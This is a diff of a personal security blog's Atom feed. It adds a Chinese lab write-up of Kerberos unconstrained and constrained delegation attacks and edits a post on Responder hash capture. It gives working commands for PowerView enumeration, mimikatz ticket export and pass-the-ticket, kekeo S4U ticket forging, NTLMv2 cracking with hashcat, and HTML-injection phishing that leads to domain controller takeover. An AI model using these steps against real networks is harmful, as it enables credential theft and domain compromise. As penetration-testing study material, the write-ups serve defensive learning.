@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://sherlocz.github.io/"/>
-  <updated>2020-12-14T08:38:36.719Z</updated>
+  <updated>2020-12-16T09:40:48.958Z</updated>
   <id>http://sherlocz.github.io/</id>
   
   <author>
@@ -17,13 +17,43 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>约束委派攻击复现</title>
+    <link href="http://sherlocz.github.io/2020/12/15/kerberos-constrained-delegation/"/>
+    <id>http://sherlocz.github.io/2020/12/15/kerberos-constrained-delegation/</id>
+    <published>2020-12-15T08:02:28.000Z</published>
+    <updated>2020-12-16T09:40:48.958Z</updated>
+    
+    <content type="html"><![CDATA[<p>不清楚原理先来复现一下</p><p>测试环境如下：</p><ul><li>dc 192.168.43.100(域控)    administrator(域管)</li><li>Test08 192.168.43.110(域内机器) testuser(域内普通用户)</li><li>域 hacke.testlab</li></ul><h1 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h1><p>首先我们要设置test08机器有非约束委派的属性<br><img src="/2020/12/15/kerberos-constrained-delegation/test08.png" alt></p><p>我们可以使用powersploit中的<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" title="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" rel="noopener">脚本</a>来获取具有非约束委派的机器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1;</span><br><span class="line">Get-NetComputer -Unconstrained -Domain hacke.testlab</span><br></pre></td></tr></table></figure><p><img src="/2020/12/15/kerberos-constrained-delegation/powersploit.png" alt></p><p>使用域管账号访问Test08这台机器<br><img src="/2020/12/15/kerberos-constrained-delegation/dir1.png" alt></p><p>这个时候会在test08这台机器上的lsass.exe内存中留下留下票据信息</p><p>testuser用户登录test08这台机器，mimikatz导出票据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/admin.png" alt></p><p>这里可以看见有一个域管的票据，用mimikat导入进去<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;1f78b6]-2-0-60a10000-Administrator@krbtgt-HACKE.TESTLAB.kirbi</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/import.png" alt></p><p>这个时候在同一cmd下发现可以访问dc了<br><img src="/2020/12/15/kerberos-constrained-delegation/dcc.png" alt></p><p>可以利用psexec直接cmd过去</p><p><img src="/2020/12/15/kerberos-constrained-delegation/ipconfig.png" alt></p><p>域控就拿下了</p><h1 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h1><p>首先要将域用户委派设置为域控的cifs<br>test= testuser，一个是名称一个是登录名，懒得改了<br><img src="/2020/12/15/kerberos-constrained-delegation/cifs.png" alt></p><p>将testuser用户设置成服务账号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A SQLServer/test08.hacke.testlab/MSSQL testuser</span><br><span class="line">setspn -L testuser</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/service.png" alt></p><p>我们可以利用先前的powerview工具来查看域中的服务账号：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\powerview.ps1;Get-DomainUser -TrustedToAuth -Domain hacke.testlab | select name</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/test.png" alt></p><p>利用<a href="https://github.com/gentilkiwi/kekeo" title="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">kekeo</a>工具生成票据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:test /domain:hacke.testlab /password:xxxx</span><br><span class="line"></span><br><span class="line">tgs::s4u /tgt:TGT_testuser@HACKE.TESTLAB_krbtgt~hacke.testlab@HACKE.TESTLAB.kirbi /user:administrator@hacke.testlab /service:cifs/dc.hacke.testlab</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/kekeo.png" alt></p><p>mimikatz导入票据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_administrator@hacke.testlab@HACKE.TESTLAB_testuser@HACKE.TESTLAB.kirbi</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/15/kerberos-constrained-delegation/mimikatz.png" alt><br>可以访问dc了</p><p>不过这种方法有前提条件，就是服务账号cifs设置的是域控的地址</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;不清楚原理先来复现一下&lt;/p&gt;
+&lt;p&gt;测试环境如下：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;dc 192.168.43.100(域控)    administrator(域管)&lt;/li&gt;
+&lt;li&gt;Test08 192.168.43.110(域内机器) testuser(域内普通用户)&lt;
+      
+    
+    </summary>
+    
+    
+    
+      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="域渗透" scheme="http://sherlocz.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Responder在渗透测试中的利用</title>
     <link href="http://sherlocz.github.io/2020/12/14/Responder-Pentest/"/>
     <id>http://sherlocz.github.io/2020/12/14/Responder-Pentest/</id>
     <published>2020-12-14T04:42:47.000Z</published>
-    <updated>2020-12-14T08:38:36.719Z</updated>
+    <updated>2020-12-14T08:53:32.429Z</updated>
     
-    <content type="html"><![CDATA[<p>#基本使用#</p><p>Github:<br><a href="https://github.com/lgandx/Responder-Windows" target="_blank" rel="noopener">https://github.com/lgandx/Responder-Windows</a><br>Kali自带<br>启用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/14/Responder-Pentest/start.png" alt><br>这里监听了这台kali，ip为192.168.43.105</p><p>使用域内其他机器访问kali的ipc，由于不存在，DNS解析不成功，回退到LLMNR和NBT-NS请求来解析目的地机器，这个时候responder会抓取到NTLMv2的hash</p><p><img src="/2020/12/14/Responder-Pentest/ipc.png" alt></p><p><img src="/2020/12/14/Responder-Pentest/hash.png" alt></p><p>抓取到的hash用<a href="https://github.com/hashcat/hashcat/releases/tag/v6.1.1" title="https://github.com/hashcat/hashcat/releases/tag/v6.1.1" target="_blank" rel="noopener">hashcat</a>解密。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/hashcat-6.1.1# ./hashcat.bin -m 5600 hash.txt pass.txt</span><br></pre></td></tr></table></figure><p>解出hash之后就可以用域用户登录了。<br><img src="/2020/12/14/Responder-Pentest/pass.png" alt></p><p>#钓鱼#<br>在Responder的配置文件中，我们可以找到html inject的相关信息<br><img src="/2020/12/14/Responder-Pentest/html.png" alt></p><p>将这个img标签新建到html中，访问<br><img src="/2020/12/14/Responder-Pentest/ip.png" alt></p><p>这里随意输入，然后点击确定，responder会接收到ntlm v2的hash<br><img src="/2020/12/14/Responder-Pentest/admin.png" alt></p><p>这里的hash并不是我们弹框输入的用户名密码的hash，而是对方机器的真实hash</p><p>#NTLMv2传递#<br>Waiting……</p>]]></content>
+    <content type="html"><![CDATA[<p>#基本使用#</p><p>Github:<br><a href="https://github.com/lgandx/Responder-Windows" target="_blank" rel="noopener">https://github.com/lgandx/Responder-Windows</a><br>Kali自带<br>启用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/14/Responder-Pentest/start.png" alt><br>这里监听了这台kali，ip为192.168.43.105</p><p>使用域内其他机器访问kali的ipc，由于不存在，DNS解析不成功，回退到LLMNR和NBT-NS请求来解析目的地机器，这个时候responder会抓取到NTLMv2的hash</p><p><img src="/2020/12/14/Responder-Pentest/ipc.png" alt></p><p><img src="/2020/12/14/Responder-Pentest/hash.png" alt></p><p>抓取到的hash用<a href="https://github.com/hashcat/hashcat/releases/tag/v6.1.1" title="https://github.com/hashcat/hashcat/releases/tag/v6.1.1" target="_blank" rel="noopener">hashcat</a>解密。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/hashcat-6.1.1# ./hashcat.bin -m 5600 hash.txt pass.txt</span><br></pre></td></tr></table></figure><p>解出hash之后就可以用域用户登录了。<br><img src="/2020/12/14/Responder-Pentest/pass.png" alt></p><p>#钓鱼#<br>在Responder的配置文件中，我们可以找到html inject的相关信息<br><img src="/2020/12/14/Responder-Pentest/html.png" alt></p><p>将这个img标签新建到html中，访问<br><img src="/2020/12/14/Responder-Pentest/ip.png" alt></p><p>这里随意输入，然后点击确定，responder会接收到ntlm v2的hash<br><img src="/2020/12/14/Responder-Pentest/admin.png" alt></p><p>这里的hash并不是我们弹框输入的用户名密码的hash，而是对方机器的真实hash</p><p>#NTLMv2传递#<br>没复现成功<br>Waiting……</p>]]></content>
     
     <summary type="html">
     
@@ -479,31 +509,6 @@
     
     
       <category term="JAVA" scheme="http://sherlocz.github.io/tags/JAVA/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>mimikatz编译</title>
-    <link href="http://sherlocz.github.io/2020/05/20/mimikatz%E7%BC%96%E8%AF%91/"/>
-    <id>http://sherlocz.github.io/2020/05/20/mimikatz编译/</id>
-    <published>2020-05-20T10:50:45.000Z</published>
-    <updated>2020-07-09T08:45:06.457Z</updated>
-    
-    <content type="html"><![CDATA[<p>我真的是菜死了，编译都不会妈鸭</p><p>主要是vs的问题<br><img src="/2020/05/20/mimikatz编译/download.png" alt><br>把旁边的 v14x工具 和 windows 10 SDK 都给安装上，不然编译的时候会报很多错误。<br>编译时候设置如下：<br><img src="/2020/05/20/mimikatz编译/1.png" alt><br><img src="/2020/05/20/mimikatz编译/2.png" alt><br>然后就可以编译了，问题不大。</p><p>拜</p><p>写文章越来越水啦</p><p>日，图片显示不出来 淦</p><p>好了好了</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;我真的是菜死了，编译都不会妈鸭&lt;/p&gt;
-&lt;p&gt;主要是vs的问题&lt;br&gt;&lt;img src=&quot;/2020/05/20/mimikatz编译/download.png&quot; alt&gt;&lt;br&gt;把旁边的 v14x工具 和 windows 10 SDK 都给安装上，不然编译的时候会报很多错
-      
-    
-    </summary>
-    
-    
-    
-      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
     
   </entry>
   
